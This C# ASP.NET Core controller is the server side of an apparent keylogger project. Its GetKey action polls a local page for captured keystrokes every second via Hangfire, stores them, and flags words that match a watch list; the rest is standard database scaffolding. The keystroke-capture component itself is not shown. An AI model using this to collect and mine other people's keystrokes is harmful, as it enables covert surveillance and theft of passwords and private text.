using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.EntityFrameworkCore;
using KeyLoggerApi.Models;
using Hangfire;
using System.Net.Http;

namespace KeyLoggerApi.Controllers
{
    public class KeyloggerController : Controller
    {
        private readonly KeyloggerContext _context;

        public KeyloggerController(KeyloggerContext context)
        {
            _context = context;
        }

        // GET: Keylogger
        public async Task<IActionResult> Index()
        {
            return View(await _context.Keyloggers.ToListAsync());
        }

        //public async Task<string> GetKey()
        //{
        //    string baseUrl = "http://localhost:8889/keylog2.html";
        //    var client = new HttpClient();
        //    var data = await client.GetStringAsync(baseUrl);

        //    var wordList = await _context.WordLists.ToListAsync();

        //    if (!string.IsNullOrEmpty(data))
        //    {
        //        string addSpace = data.Replace("<", " <");
        //        string replaceString = addSpace.Replace("\n ", " ");
        //        replaceString = replaceString.Replace("\n", " ");
        //        List<string> words;
        //        words = replaceString.Split(" ").ToList();
        //        foreach (var word in words)
        //        {
        //            DetectedWord detectedWord = new DetectedWord();
        //            Keylogger keylogger = new Keylogger();
        //            WordList detection = new WordList();

        //            keylogger.Keystroke = word;
        //            _context.Add(keylogger);
                    
        //            detection = wordList.Where(x => x.Description.ToLower() == word.ToLower()).FirstOrDefault();
        //            if (detection != null)
        //            {
        //                detectedWord.Description = detection.Description;
        //                _context.Add(detectedWord);
        //            }
        //            await _context.SaveChangesAsync();
        //        }
        //    }                      
           
        //    return data;
        //}

        public async Task<string> GetKey()
        {
            string baseUrl = "http://localhost:8889/keylog2.html";
            var client = new HttpClient();
            var data = await client.GetStringAsync(baseUrl);

            var wordList = await _context.WordLists.Select(x => x.Description).ToListAsync();

            if (!string.IsNullOrEmpty(data))
            {                               
                Keylogger keylogger = new Keylogger();

                keylogger.Keystroke = data;
                _context.Add(keylogger);

                var detections = wordList.Where(x => data.Contains(x)).ToList();
                if (detections != null)
                {
                    foreach(var detection in detections)
                    {
                        DetectedWord detectedWord = new DetectedWord();
                        detectedWord.Description = detection;
                        _context.Add(detectedWord);
                    }
                    
                }
                    await _context.SaveChangesAsync();
            }

            return data;
        }

        public async Task<bool> StartLogging()
        {
            RecurringJob.AddOrUpdate(() => GetKey(), "*/1 * * * * *");
            return true;
        }

        public async Task<IActionResult>DeleteAll()
        {
            await _context.Database.ExecuteSqlRawAsync("TRUNCATE TABLE [Keyloggers]");
            return RedirectToAction("Index");

        }


        // GET: Keylogger/Details/5
        public async Task<IActionResult> Details(int? id)
        {
            if (id == null)
            {
                return NotFound();
            }

            var keylogger = await _context.Keyloggers
                .FirstOrDefaultAsync(m => m.Id == id);
            if (keylogger == null)
            {
                return NotFound();
            }

            return View(keylogger);
        }

        // GET: Keylogger/Create
        public IActionResult Create()
        {
            return View();
        }

        // POST: Keylogger/Create
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details, see http://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Create([Bind("Id,Keystroke,CreationDate")] Keylogger keylogger)
        {
            if (ModelState.IsValid)
            {
                _context.Add(keylogger);
                await _context.SaveChangesAsync();
                return RedirectToAction(nameof(Index));
            }
            return View(keylogger);
        }

        // GET: Keylogger/Edit/5
        public async Task<IActionResult> Edit(int? id)
        {
            if (id == null)
            {
                return NotFound();
            }

            var keylogger = await _context.Keyloggers.FindAsync(id);
            if (keylogger == null)
            {
                return NotFound();
            }
            return View(keylogger);
        }

        // POST: Keylogger/Edit/5
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details, see http://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Edit(int id, [Bind("Id,Keystroke,CreationDate")] Keylogger keylogger)
        {
            if (id != keylogger.Id)
            {
                return NotFound();
            }

            if (ModelState.IsValid)
            {
                try
                {
                    _context.Update(keylogger);
                    await _context.SaveChangesAsync();
                }
                catch (DbUpdateConcurrencyException)
                {
                    if (!KeyloggerExists(keylogger.Id))
                    {
                        return NotFound();
                    }
                    else
                    {
                        throw;
                    }
                }
                return RedirectToAction(nameof(Index));
            }
            return View(keylogger);
        }

        // GET: Keylogger/Delete/5
        public async Task<IActionResult> Delete(int? id)
        {
            if (id == null)
            {
                return NotFound();
            }

            var keylogger = await _context.Keyloggers
                .FirstOrDefaultAsync(m => m.Id == id);
            if (keylogger == null)
            {
                return NotFound();
            }

            return View(keylogger);
        }

        // POST: Keylogger/Delete/5
        [HttpPost, ActionName("Delete")]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> DeleteConfirmed(int id)
        {
            var keylogger = await _context.Keyloggers.FindAsync(id);
            _context.Keyloggers.Remove(keylogger);
            await _context.SaveChangesAsync();
            return RedirectToAction(nameof(Index));
        }

        private bool KeyloggerExists(int id)
        {
            return _context.Keyloggers.Any(e => e.Id == id);
        }
    }
}
